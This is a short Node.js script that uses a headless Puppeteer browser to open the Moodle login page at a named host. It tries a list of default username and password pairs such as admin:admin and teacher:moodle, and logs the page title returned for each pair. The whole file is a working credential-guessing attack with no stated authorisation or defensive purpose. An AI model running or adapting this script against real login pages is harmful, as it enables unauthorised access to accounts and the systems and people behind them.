const puppeteer = require('puppeteer');

async function testCreds(user, pass) {
    const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
    const page = await browser.newPage();
    await page.goto('https://moodle.rasppi.cloud/login/index.php', { waitUntil: 'networkidle2' });
    await page.type('#username', user);
    await page.type('#password', pass);
    await page.click('#loginbtn');
    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    const title = await page.title();
    console.log(`[${user}:${pass}] -> ${title}`);
    await browser.close();
}

(async () => {
    await testCreds('admin', 'sandbox');
    await testCreds('admin', 'password');
    await testCreds('admin', 'admin');
    await testCreds('manager', 'moodle');
    await testCreds('teacher', 'moodle');
    await testCreds('professor', 'moodle');
})();
